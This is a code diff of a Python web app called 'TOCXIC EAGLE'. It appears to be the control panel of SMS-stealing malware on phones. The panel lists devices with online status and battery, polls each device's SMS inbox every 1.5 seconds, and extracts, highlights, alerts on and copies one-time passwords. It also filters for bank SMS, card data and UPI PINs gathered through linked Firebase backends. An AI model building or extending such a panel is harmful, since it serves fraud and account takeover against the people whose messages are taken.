+#toast.show{transform:translateX(-50%) translateY(0)}
+
+.hidden{display:none !important}
+@media(max-width:600px){
+  .grid-main{grid-template-columns:1fr}
+  .drawer{max-width:100%}
+  .stats-bar{padding:0 8px}.stat-item{padding:8px 12px}
+  .topbar{padding:0 12px}
+  .bc-fab{bottom:20px;right:20px;width:52px;height:52px;font-size:22px}
+}
 """
 
-
 # ============================================================
-# ADMIN LOGIN PAGE
-# ============================================================
-ADMIN_LOGIN_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Admin</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<meta name="theme-color" content="#0F3CC9">
-""" + ORBITRON + """
-<style>""" + MOBILE_CSS + """
-body{min-height:100vh;display:flex;align-items:center;justify-content:center;
-background:linear-gradient(135deg,#0F3CC9,#1e293b);color:#e2e8f0;padding:20px}
-.box{width:100%;max-width:400px;background:#fff;border:1px solid #334155;
-border-radius:22px;padding:34px 26px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
-.lock{text-align:center;font-size:52px;margin-bottom:14px}
-h1{text-align:center;font-family:'Orbitron',sans-serif;font-size:20px;margin-bottom:6px;
-background:linear-gradient(135deg,#E40000,#f59e0b);-webkit-background-clip:text;
-background-clip:text;color:transparent;letter-spacing:2px;font-weight:900}
-p.sub{text-align:center;font-size:12px;color:#667085;margin-bottom:24px;
-font-family:'Orbitron',sans-serif;letter-spacing:2px;text-transform:uppercase}
-.pwd-wrap{position:relative}
-input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;
-border:1.5px solid #e5e7eb;background:#f9fafb;color:#101828;outline:none;transition:.2s}
-input:focus{border-color:#f59e0b;background:#fff;box-shadow:0 0 0 4px rgba(245,158,11,.15)}
-.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);
-cursor:pointer;font-size:20px;color:#667085;padding:4px}
-button{width:100%;margin-top:16px;padding:16px;border:none;border-radius:12px;
-background:linear-gradient(135deg,#E40000,#f59e0b);color:#fff;font-weight:800;
-font-size:14px;font-family:'Orbitron',sans-serif;letter-spacing:1px;
-cursor:pointer;min-height:54px;text-transform:uppercase}
-button:active{transform:scale(.98)}
-.err{margin-top:14px;text-align:center;color:#f04438;font-size:13px;font-weight:700}
-.back-link{display:block;text-align:center;margin-top:16px;color:#667085;
-text-decoration:none;font-size:12px}
-</style></head><body>
-<form class="box" method="POST"><div class="lock">👑</div>
-<h1>SUPER MASTER</h1><p class="sub">Admin access</p>
-<div class="pwd-wrap">
-<input type="password" id="pwd" name="password" placeholder="Admin Password" required autofocus>
-<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
-</div>
-<button type="submit">Admin Login</button>__ERROR__
-<a href="/" class="back-link">← Back to landing</a>
-</form>
-<script>
-function togglePwd(e){
-  var i=document.getElementById('pwd'); var t=e.target;
-  if(i.type==='password'){i.type='text';t.textContent='🙈';}
-  else{i.type='password';t.textContent='👁️';}
-}
-</script>
-</body></html>"""
-
-
-# ============================================================
-# LANDING PAGE
+# LANDING
 # ============================================================
 LANDING_HTML = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <meta name="theme-color" content="#E40000">
 """ + ORBITRON + """
-<style>""" + MOBILE_CSS + """
+<style>""" + DARK_CSS + """
 body{min-height:100vh;display:flex;align-items:center;justify-content:center;
-background:radial-gradient(ellipse at top,#ffe4e4 0%,#f5f6fa 40%,#eef2ff 100%);
-color:#101828;padding:30px 20px;text-align:center}
+background:radial-gradient(ellipse 80% 60% at 70% 0%,#2a0a0a 0%,transparent 60%),
+radial-gradient(ellipse 70% 50% at 30% 100%,#0a1240 0%,transparent 65%),var(--bg);
+padding:30px 20px;text-align:center}
 .wrap{max-width:560px;width:100%}
-.eagle{font-size:96px;margin-bottom:14px;filter:drop-shadow(0 12px 32px rgba(228,0,0,.35));
-animation:float 3s ease-in-out infinite}
+.eagle{font-size:96px;margin-bottom:14px;animation:float 3s ease-in-out infinite}
 @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
 h1{font-family:'Orbitron',sans-serif;font-weight:900;font-size:36px;letter-spacing:3px;
-margin-bottom:10px;background:linear-gradient(135deg,#E40000 0%,#0F3CC9 100%);
--webkit-background-clip:text;background-clip:text;color:transparent}
-.subtitle{font-family:'Orbitron',sans-serif;font-weight:600;font-size:11px;color:#98a2b3;
+margin-bottom:10px;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.subtitle{font-family:'Orbitron',sans-serif;font-weight:600;font-size:11px;color:var(--text3);
 letter-spacing:4px;margin-bottom:36px;text-transform:uppercase}
-.tagline{font-size:15px;color:#475467;line-height:1.7;margin-bottom:40px}
+.tagline{font-size:15px;color:var(--text2);line-height:1.7;margin-bottom:40px}
 .cta-grid{display:grid;grid-template-columns:1fr;gap:14px;max-width:400px;margin:0 auto 40px}
 @media(min-width:520px){.cta-grid{grid-template-columns:1fr 1fr}}
 .cta{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;
 padding:28px 20px;border-radius:22px;text-decoration:none;color:#fff;font-weight:800;
-transition:.25s;min-height:140px}
-.cta.user{background:linear-gradient(135deg,#E40000 0%,#FF4D4D 100%);
-box-shadow:0 12px 32px rgba(228,0,0,.35)}
-.cta.otp{background:linear-gradient(135deg,#0F3CC9 0%,#3B82F6 100%);
-box-shadow:0 12px 32px rgba(15,60,201,.35)}
+transition:.25s;min-height:140px;border:1px solid var(--border2);background:var(--bg2)}
+.cta.user{border-color:rgba(228,0,0,.4);box-shadow:0 0 30px rgba(228,0,0,.15) inset}
+.cta.otp{border-color:rgba(15,60,201,.4);box-shadow:0 0 30px rgba(15,60,201,.15) inset}
 .cta:active{transform:scale(.97)}
 .cta .icon{font-size:42px}
 .cta .label{font-family:'Orbitron',sans-serif;font-size:14px;letter-spacing:1.5px;text-transform:uppercase}
-.cta .desc{font-size:11px;opacity:.85;font-weight:600}
-.features{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;max-width:520px;margin:0 auto}
-.feat{background:rgba(255,255,255,.7);border:1px solid rgba(255,255,255,.9);
-border-radius:16px;padding:16px 10px;text-align:center}
-.feat .fi{font-size:24px;margin-bottom:6px}
-.feat .fl{font-size:10px;font-weight:800;color:#344054;font-family:'Orbitron',sans-serif;
-letter-spacing:.8px;text-transform:uppercase}
-.footer{margin-top:44px;font-size:10px;color:#98a2b3;font-family:'Orbitron',sans-serif;
+.cta .desc{font-size:11px;color:var(--text3);font-weight:600}
+.footer{margin-top:44px;font-size:10px;color:var(--text3);font-family:'Orbitron',sans-serif;
 letter-spacing:3px;text-transform:uppercase}
 </style></head><body>
 <div class="wrap">
@@ -1150,1027 +993,130 @@ letter-spacing:3px;text-transform:uppercase}
 <span class="desc">Add your firebase</span>
 </a>
 </div>
-<div class="features">
-<div class="feat"><div class="fi">⚡</div><div class="fl">Realtime</div></div>
-<div class="feat"><div class="fi">🛡️</div><div class="fl">Secure</div></div>
-<div class="feat"><div class="fi">🔄</div><div class="fl">Auto 10m</div></div>
-</div>
 <div class="footer">TOCXIC EAGLE · v71</div>
 </div>
 </body></html>"""
 
+# ============================================================
+# ADMIN LOGIN
+# ============================================================
+ADMIN_LOGIN_HTML = """<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Admin</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+""" + ORBITRON + """
+<style>""" + DARK_CSS + """
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;
+background:radial-gradient(ellipse at top,#2a0a0a 0%,#08090b 60%),var(--bg);padding:20px}
+.box{width:100%;max-width:400px;background:var(--bg2);border:1px solid var(--border2);
+border-radius:22px;padding:34px 26px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.lock{text-align:center;font-size:52px;margin-bottom:14px}
+h1{text-align:center;font-family:'Orbitron',sans-serif;font-size:20px;margin-bottom:6px;
+background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;
+letter-spacing:2px;font-weight:900}
+p.sub{text-align:center;font-size:12px;color:var(--text3);margin-bottom:24px;
+font-family:'Orbitron',sans-serif;letter-spacing:2px;text-transform:uppercase}
+.pwd-wrap{position:relative}
+input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;
+border:1.5px solid var(--border2);background:var(--bg3);color:var(--text);outline:none;transition:.2s}
+input:focus{border-color:var(--amber);box-shadow:0 0 0 4px rgba(245,158,11,.15)}
+.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);
+cursor:pointer;font-size:20px;color:var(--text3);padding:4px}
+button{width:100%;margin-top:16px;padding:16px;border:none;border-radius:12px;
+background:var(--grad);color:#fff;font-weight:800;font-size:14px;
+font-family:'Orbitron',sans-serif;letter-spacing:1px;cursor:pointer;min-height:54px;text-transform:uppercase}
+button:active{transform:scale(.98)}
+.err{margin-top:14px;text-align:center;color:var(--red2);font-size:13px;font-weight:700}
+.back-link{display:block;text-align:center;margin-top:16px;color:var(--text3);
+text-decoration:none;font-size:12px}
+</style></head><body>
+<form class="box" method="POST"><div class="lock">👑</div>
+<h1>SUPER MASTER</h1><p class="sub">Admin access</p>
+<div class="pwd-wrap">
+<input type="password" id="pwd" name="password" placeholder="Admin Password" required autofocus>
+<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
+</div>
+<button type="submit">Admin Login</button>__ERROR__
+<a href="/" class="back-link">← Back to landing</a>
+</form>
+<script>
+function togglePwd(e){var i=document.getElementById('pwd');var t=e.target;
+if(i.type==='password'){i.type='text';t.textContent='🙈';}
+else{i.type='password';t.textContent='👁️';}}
+</script>
+</body></html>"""
 
 # ============================================================
-# USER DASHBOARD (NO LOGIN, read-only, receives broadcasts)
+# MAIN PANEL HTML — Used for BOTH /user and /admin/dashboard
+# Difference: {SHOW_BC_FAB} true/false, {NAV_LINKS} differ
 # ============================================================
-USER_DASHBOARD_HTML = """<!DOCTYPE html>
+PANEL_HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Panel</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
 <meta name="theme-color" content="#E40000">
 """ + ORBITRON + """
-<style>""" + MOBILE_CSS + BRAND_CSS + """</style></head><body>
+<style>""" + DARK_CSS + """</style></head><body>
 
-<div class="topbar">
-<div class="brand"><span class="eagle">🦅</span>
-<div><span class="name">TOCXIC EAGLE</span><span class="sub">USER PANEL</span></div></div>
-<div class="nav">
-<a href="/user" class="nav-link active">📱 Numbers</a>
-<a href="/otp" class="nav-link otp">🔐 Personal OTP</a>
-</div>
-<div style="display:flex;align-items:center;gap:10px">
-<button onclick="manualRefresh()" style="background:var(--grad);color:#fff;border:none;
-width:42px;height:42px;border-radius:50%;font-size:18px">🔄</button>
-<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
-<button id="top-num-btn" onclick="showTopNum()" style="display:none; background:linear-gradient(135deg,#fbbf24,#f59e0b); color:#fff; border:none; width:42px; height:42px; border-radius:50%; font-size:18px; align-items:center; justify-content:center; box-shadow:0 4px 12px rgba(251,191,36,0.4);">📞</button>
-<a href="/" class="nav-link">🏠</a>
-</div>
-</div>
+<div id="login-page" style="display:none"></div>
 
-<div class="container">
-<div id="list-view">
-<div class="stats">
-<div class="stat total"><div class="label">Total</div><div class="value" id="s-total">0</div></div>
-<div class="stat online"><div class="label">Online</div><div class="value" id="s-online">0</div></div>
-<div class="stat offline"><div class="label">Offline</div><div class="value" id="s-offline">0</div></div>
-<div class="stat otp"><div class="label">OTP Rate</div><div class="value" id="s-otp">0%</div></div>
-</div>
-<div class="quick">
-<div class="info">📱 Numbers <b id="q-dev">0</b></div>
-<div class="btns"><button class="green" onclick="manualRefresh()">🔄 Refresh</button></div>
-</div>
-<div class="num-filter-bar">
-<button class="num-filter-btn active" id="nf-all" onclick="setNumberFilter('all')">All <span class="cnt" id="nf-all-c">0</span></button>
-<button class="num-filter-btn" id="nf-online" onclick="setNumberFilter('online')">🟢 Online <span class="cnt" id="nf-online-c">0</span></button>
-<button class="num-filter-btn" id="nf-offline" onclick="setNumberFilter('offline')">🔴 Offline <span class="cnt" id="nf-offline-c">0</span></button>
-</div>
-<div id="loading-text" class="loading-text">
-<span class="spinner"></span><span id="loading-msg">Loading...</span>
-<div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div>
-</div>
-<div id="list-content" class="hidden">
-<div class="search-box"><input id="search-num" placeholder="🔎 Search number / device" oninput="renderNumbers()"></div>
-<div class="list-header">
-<h2>📱 Numbers <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2>
-<span class="count" id="num-count">0</span>
-</div>
-<div id="num-list"></div>
-</div>
-</div>
+<div id="main-page" style="display:flex">
+  <div class="topbar">
+    <div class="topbar-logo">
+      <span class="eagle">🦅</span>
+      <span class="name">TOCXIC EAGLE</span>
+    </div>
+    <div class="search-wrap">
+      <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      <input class="search-inp" id="search-inp" placeholder="Search devices…" oninput="renderGrid()">
+    </div>
+    <div class="topbar-right">
+      <div class="badge badge-green"><div class="dot dot-green" id="conn-dot"></div><span id="conn-txt">Live</span></div>
+      <div class="clock" id="clock"></div>
+      <button class="btn btn-ghost btn-sm" onclick="refreshAll()">↻</button>
+    </div>
+  </div>
 
-<div id="inbox-view" class="hidden">
-<div class="inbox-header">
-<div class="inbox-top">
-<a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a>
-<div style="flex:1">
-<div class="inbox-num" id="inbox-num">+91 ------</div>
-<div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div>
-</div>
-</div>
-<div class="inbox-meta">
-<span>⚡ LIVE · auto 1s · Latest 10 SMS</span>
-<span class="refresh-icon" onclick="loadInbox(true)">🔄</span>
-</div>
-<div class="mail-tab-bar" style="margin-top:14px">
-<button class="mail-tab-btn active" id="mt-sms" onclick="setMailTab('sms')">🛜 SMS</button>
-<button class="mail-tab-btn" id="mt-mail" onclick="setMailTab('mail')">📧 Broadcast Mail <span id="mail-unread-cnt" style="display:none;background:#E40000;color:#fff;padding:1px 7px;border-radius:8px;font-size:9px;margin-left:4px;font-weight:900"></span></button>
-</div>
-<div class="filter-bar">
-<button class="filter-btn" id="fb-10m" onclick="setFilter('10m')">⚡ 10 min</button>
-<button class="filter-btn active" id="fb-recent" onclick="setFilter('recent')">🔥 24h</button>
-<button class="filter-btn" id="fb-all" onclick="setFilter('all')">📜 All</button>
-</div>
-</div>
-<div id="sms-container"></div>
-</div>
+  <div class="nav-links">{NAV_LINKS}</div>
+
+  <div class="stats-bar">
+    <div class="stat-item"><div class="stat-n" id="stat-total">0</div><div class="stat-l">Total</div></div>
+    <div class="stat-item"><div class="stat-n" style="color:var(--green)" id="stat-online">0</div><div class="stat-l">📡 Online</div></div>
+    <div class="stat-item"><div class="stat-n" style="color:var(--red2)" id="stat-offline">0</div><div class="stat-l">⚠️ Offline</div></div>
+    <div class="stat-item"><div class="stat-n" style="color:var(--green)" id="stat-bank">0</div><div class="stat-l">Bank SMS</div></div>
+    <div class="stat-item"><div class="stat-n" style="color:var(--purple)" id="stat-card">0</div><div class="stat-l">Cards</div></div>
+    <div class="stat-item" style="border:none"><div class="stat-n" style="color:var(--blue2)" id="stat-mail">0</div><div class="stat-l">📧 Mail</div></div>
+  </div>
+
+  <div class="filter-bar">
+    <button class="filter-btn active" onclick="setFilter('all',this)">All</button>
+    <button class="filter-btn" onclick="setFilter('online',this)">📡 Online</button>
+    <button class="filter-btn" onclick="setFilter('offline',this)">⚠️ Offline</button>
+    <button class="filter-btn" onclick="setFilter('bank',this)">Bank SMS</button>
+    <button class="filter-btn" onclick="setFilter('card',this)">Cards</button>
+    <button class="filter-btn" onclick="setFilter('upi',this)">UPI PIN</button>
+    <select class="sort-select" onchange="setSort(this.value)">
+      <option value="new">Newest</option>
+      <option value="old">Oldest</option>
+      <option value="name">Name A–Z</option>
+      <option value="battery">Battery</option>
+    </select>
+  </div>
+
+  <div class="grid-main" id="device-grid">
+    <div class="empty"><span class="empty-icon">📡</span>Connecting…</div>
+  </div>
 </div>
 
-<div id="toast" class="toast"></div>
+{SHOW_BC_FAB}
 
-<script>
-let allNumbers = [], numbers = [], currentNum = null;
-let refreshTimer = null, lastSig = '', lastInboxSig = '', allInboxMsgs = [];
-let currentFilter = 'recent', currentNumberFilter = 'all', currentMailTab = 'sms';
-let lastOtpSeen = '', notifAsked = false;
-let currentTopNumber = null;
-let allBroadcasts = [];
-
-function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
-e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2500); }
-
-function playSound(){ try{
-const ctx = new (window.AudioContext||window.webkitAudioContext)();
-[880,1100,880].forEach((f,i)=>{ const o = ctx.createOscillator(), g = ctx.createGain();
-o.connect(g); g.connect(ctx.destination); o.frequency.value = f;
-const t = ctx.currentTime + i*0.2; g.gain.setValueAtTime(0.2,t);
-g.gain.exponentialRampToValueAtTime(0.001,t+0.18); o.start(t); o.stop(t+0.18); }); }catch(e){} }
-
-function askNotif(){ if(notifAsked) return; notifAsked = true;
-if('Notification' in window && Notification.permission === 'default') Notification.requestPermission(); }
-
-function showOtpNotif(otp, from, msg){
-toast('🔔 OTP: ' + otp + ' — ' + from); playSound();
-if('Notification' in window && Notification.permission === 'granted'){
-try{ const n = new Notification('🔔 OTP: ' + otp, { body: from + '\\n' + msg.slice(0,100), tag:'otp-'+otp });
-setTimeout(()=>n.close(), 10000); }catch(e){} }
-if(navigator.vibrate){ try{ navigator.vibrate([200,100,200,100,200]); }catch(e){} } }
-
-async function manualRefresh(){ toast('🔄 Refreshing...');
-try{ const r = await fetch('/api/refresh',{method:'POST'}); const d = await r.json();
-if(d.success){ setTimeout(loadNumbers, 800); toast('✅ Triggered'); }
-else toast('❌ ' + (d.error||'Failed')); } catch(e){ toast('❌ Network error'); } }
-
-function setNumberFilter(f){ currentNumberFilter = f;
-document.getElementById('nf-all').classList.toggle('active', f==='all');
-document.getElementById('nf-online').classList.toggle('active', f==='online');
-document.getElementById('nf-offline').classList.toggle('active', f==='offline');
-applyFilter(); renderNumbers(); }
-
-function setFilter(f){ currentFilter = f;
-document.getElementById('fb-10m').classList.toggle('active', f==='10m');
-document.getElementById('fb-recent').classList.toggle('active', f==='recent');
-document.getElementById('fb-all').classList.toggle('active', f==='all');
-renderMessages(); }
-
-function setMailTab(t){
-  currentMailTab = t;
-  document.getElementById('mt-sms').classList.toggle('active', t==='sms');
-  document.getElementById('mt-mail').classList.toggle('active', t==='mail');
-  if(t === 'mail'){ loadBroadcasts(currentNum); }
-  renderMessages();
-}
-
-function applyFilter(){
-if(currentNumberFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
-else if(currentNumberFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
-else numbers = allNumbers.slice();
-document.getElementById('num-count').textContent = numbers.length; }
-
-async function checkConn(){
-try{ const r = await fetch('/api/conn'); const d = await r.json();
-const b = document.getElementById('conn-badge'), t = document.getElementById('conn-text');
-if(d.mongo_connected){ b.className = 'conn online'; t.textContent = 'Live'; }
-else { b.className = 'conn offline'; t.textContent = 'Off'; } }catch(e){} }
-
-async function loadNumbers(){
-try{ const r = await fetch('/api/numbers'); const d = await r.json();
-if(!d.success){ document.getElementById('loading-msg').textContent = '❌ ' + (d.error||'Error'); return; }
-allNumbers = d.numbers || [];
-document.getElementById('s-total').textContent = d.total;
-document.getElementById('s-online').textContent = d.online;
-document.getElementById('s-offline').textContent = d.offline;
-document.getElementById('s-otp').textContent = d.otp_rate + '%';
-document.getElementById('q-dev').textContent = allNumbers.length;
-document.getElementById('nf-all-c').textContent = allNumbers.length;
-document.getElementById('nf-online-c').textContent = d.online || 0;
-document.getElementById('nf-offline-c').textContent = d.offline || 0;
-if(d.progress){ const pct = d.progress.total > 0 ? Math.floor(d.progress.done/d.progress.total*100) : 0;
-document.getElementById('prog-fill').style.width = pct + '%';
-document.getElementById('loading-msg').textContent = 'Fetching ' + d.progress.done + '/' + d.progress.total + ' (' + pct + '%)...'; }
-applyFilter();
-if(allNumbers.length > 0){
-document.getElementById('loading-text').classList.add('hidden');
-document.getElementById('list-content').classList.remove('hidden');
-const sig = allNumbers.length + '|' + d.online + '|' + currentNumberFilter;
-if(sig !== lastSig){ lastSig = sig; renderNumbers(); } }
-else { document.getElementById('loading-text').classList.remove('hidden');
-document.getElementById('loading-msg').textContent = d.loading ? '⏳ Loading...' : '📭 No numbers'; }
-}catch(e){ document.getElementById('loading-msg').textContent = '❌ Network error'; } }
-
-function renderNumbers(){
-const q = (document.getElementById('search-num').value || '').toLowerCase();
-const box = document.getElementById('num-list');
-const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) ||
-(n.device_name||'').toLowerCase().includes(q) || (n.fb_name||'').toLowerCase().includes(q));
-if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers found</div>'; return; }
-box.innerHTML = filtered.map(n => {
-const isOn = n.online === true;
-const isUnk = (n.number||'').startsWith('UNKNOWN-');
-const iconCls = isUnk ? 'gray' : (isOn ? '' : 'red');
-const badgeCls = isOn ? 'badge-online' : 'badge-offline';
-const badgeTxt = isOn ? 'Online' : 'Offline';
-const cardCls = isOn ? '' : 'offline';
-const titleCls = isUnk ? 'unknown' : '';
-const conf = n.confidence || 0;
-let confB = '';
-if(!isUnk && conf > 0) confB = '<span class="confidence-badge">✓ ' + conf + 'x</span>';
-const idx = numbers.indexOf(n);
-return '<div class="num-card ' + cardCls + '">' +
-'<div class="num-icon ' + iconCls + '" onclick="openInboxAt(' + idx + ')">' + (isUnk ? '❓' : '📶') + '</div>' +
-'<div class="num-info" onclick="openInboxAt(' + idx + ')">' +
-'<div class="num-title ' + titleCls + '">' + escapeHtml(n.number) + ' ' + confB + '</div>' +
-'<div class="num-sub"><span class="pill">📨 ' + n.msg_count + ' SMS</span>' +
-(n.otp_count > 0 ? '<span class="pill otp">🔑 ' + n.otp_count + ' OTP</span>' : '') + '</div></div>' +
-'<div class="' + badgeCls + '" onclick="openInboxAt(' + idx + ')"><span class="dot"></span>' + badgeTxt + '</div>' +
-'<div class="arrow">›</div></div>'; }).join(''); }
-
-function openInboxAt(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }
-
-async function openInbox(n){
-currentNum = n; lastInboxSig = ''; allInboxMsgs = []; allBroadcasts = [];
-currentFilter = 'recent'; lastOtpSeen = ''; currentMailTab = 'sms';
-currentTopNumber = null; updateTopBadge([]);
-askNotif();
-document.getElementById('fb-10m').classList.remove('active');
-document.getElementById('fb-recent').classList.add('active');
-document.getElementById('fb-all').classList.remove('active');
-document.getElementById('mt-sms').classList.add('active');
-document.getElementById('mt-mail').classList.remove('active');
-document.getElementById('list-view').classList.add('hidden');
-document.getElementById('inbox-view').classList.remove('hidden');
-document.getElementById('inbox-num').textContent = n.number;
-const statusEl = document.getElementById('inbox-status');
-const statusTxt = document.getElementById('inbox-status-text');
-if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
-else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
-document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
-await Promise.all([ loadInbox(false), loadBroadcasts(n) ]);
-if(refreshTimer) clearInterval(refreshTimer);
-refreshTimer = setInterval(()=>{ if(currentMailTab === 'sms') loadInbox(false); }, 1500);
-}
-
-async function loadBroadcasts(n){
-  if(!n) return;
-  try{
-    const r = await fetch('/api/broadcasts/inbox?device_id=' + encodeURIComponent(n.device_id) +
-                          '&fb=' + encodeURIComponent(n.firebase) +
-                          '&num=' + encodeURIComponent(n.number));
-    const d = await r.json();
-    if(d.success){
-      allBroadcasts = d.broadcasts || [];
-      const unread = allBroadcasts.filter(b => !b.read).length;
-      const cnt = document.getElementById('mail-unread-cnt');
-      if(unread > 0){ cnt.style.display = 'inline-block'; cnt.textContent = unread; }
-      else cnt.style.display = 'none';
-      if(currentMailTab === 'mail') renderMessages();
-    }
-  }catch(e){}
-}
-
-function findTop(msgs){ const counter = {}, senders = new Set();
-msgs.forEach(m => { for(const n of (m.from||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []) senders.add(n); });
-msgs.forEach(m => { for(const n of (m.message||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []){
-if(senders.has(n)) continue; if(n.startsWith('1800')||n.startsWith('1900')||n.startsWith('1991')) continue;
-counter[n] = (counter[n]||0) + 1; } });
-let top = null, cnt = 0;
-for(const [n, c] of Object.entries(counter)) if(c > cnt){ top = n; cnt = c; }
-return top ? {number: top, count: cnt} : null; }
-
-function updateTopBadge(msgs){
-const btn = document.getElementById('top-num-btn');
-if(!btn) return;
-const t = findTop(msgs);
-if(t && t.count >= 2){ currentTopNumber = t.number; btn.style.display = 'inline-flex'; }
-else { currentTopNumber = null; btn.style.display = 'none'; }
-}
-
-function showTopNum(){
-if(currentTopNumber){
-toast('📞 Top Number: ' + currentTopNumber);
-if(navigator.clipboard) navigator.clipboard.writeText(currentTopNumber);
-} else { toast('❌ Koi frequent number nahi mila'); }
-}
-
-async function loadInbox(showLoader){
-if(!currentNum) return;
-if(showLoader) document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>';
-const c = new AbortController(); const tid = setTimeout(()=>c.abort(), 15000);
-try{ const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) +
-'&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number),
-{ signal: c.signal }); clearTimeout(tid);
-const d = await r.json();
-if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ ' + (d.error||'Error') + '</div>'; return; }
-const msgs = d.messages || []; allInboxMsgs = msgs;
-if(msgs.length > 0){ const newest = msgs[0];
-const otp = newest.otp || extractOtp(newest.message);
-const sig = (newest.timestamp||0) + '|' + otp + '|' + (newest.message||'').slice(0,40);
-if(otp && sig !== lastOtpSeen){ lastOtpSeen = sig; showOtpNotif(otp, newest.from||'Unknown', newest.message||''); } }
-const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
-if(sig !== lastInboxSig){ lastInboxSig = sig; if(currentMailTab === 'sms') renderMessages(); }
-}catch(e){ clearTimeout(tid); } }
-
-function timeAgo(ts, now){
-if(!ts) return ''; const d = now - ts;
-if(d < 10) return 'अभी'; if(d < 60) return d + 's';
-if(d < 3600) return Math.floor(d/60) + 'm'; if(d < 86400) return Math.floor(d/3600) + 'h';
-return Math.floor(d/86400) + 'd'; }
-
-function highlightPhones(t){ return t.replace(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g, '<span class="phone-highlight">$1</span>'); }
-
-function renderMessages(){
-const box = document.getElementById('sms-container');
-const now = Math.floor(Date.now()/1000);
-
-if(currentMailTab === 'mail'){
-  // Render broadcast mail
-  if(!allBroadcasts.length){
-    box.innerHTML = '<div class="empty">📭 No broadcast mail received yet</div>';
-    return;
-  }
-  let list = [...allBroadcasts].sort((a,b) => (b.created_at||0) - (a.created_at||0)).slice(0, 50);
-  box.innerHTML = '<div class="sms-list">' + list.map(b => {
-    const isFresh = (b.created_at||0) >= now - 120;
-    const timeStr = fmtTime(b.created_at);
-    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
-    const unreadDot = !b.read ? ' ●' : '';
-    return '<div class="sms-item mail-item ' + (isFresh?'fresh':'') + '" onclick="markBcRead(\\'' + b.id + '\\')">' +
-      '<div class="msg-type-badge mail">📧 MAIL</div>' +
-      '<div class="sms-head"><div class="sender mail-sender">📧 ADMIN BROADCAST' + unreadDot + ' ' + newBadge + '</div>' +
-      '<div style="text-align:right"><div class="sms-time ' + (isFresh?'fresh':'') + '">' + escapeHtml(timeStr) + '</div>' +
-      '<div class="time-ago ' + (isFresh?'fresh':'') + '">' + timeAgo(b.created_at, now) + '</div></div></div>' +
-      '<div class="sms-body">' + escapeHtml(b.message || '') + '</div></div>';
-  }).join('') + '</div>';
-  return;
-}
-
-// SMS tab (default)
-let msgs = allInboxMsgs;
-if(currentFilter === '10m') msgs = msgs.filter(m => (m.timestamp||0) >= now - 600);
-else if(currentFilter === 'recent') msgs = msgs.filter(m => (m.timestamp||0) >= now - 86400);
-msgs = [...msgs].sort((a,b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 10);
-updateTopBadge(msgs);
-if(!msgs.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
-box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
-const otp = m.otp || extractOtp(m.message);
-let body = otp ? escapeHtml(m.message).replace(otp, '<span class="otp-highlight">' + otp + '</span>') : escapeHtml(m.message);
-body = highlightPhones(body);
-const copyBtn = otp ? '<button class="otp-copy-btn" onclick="event.stopPropagation();copyOtp(\\'' + otp + '\\')">📋 Copy OTP ' + otp + '</button>' : '';
-const ts = m.timestamp || 0; const isFresh = ts >= now - 120;
-const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
-const timeStr = m.date_string || fmtTime(ts);
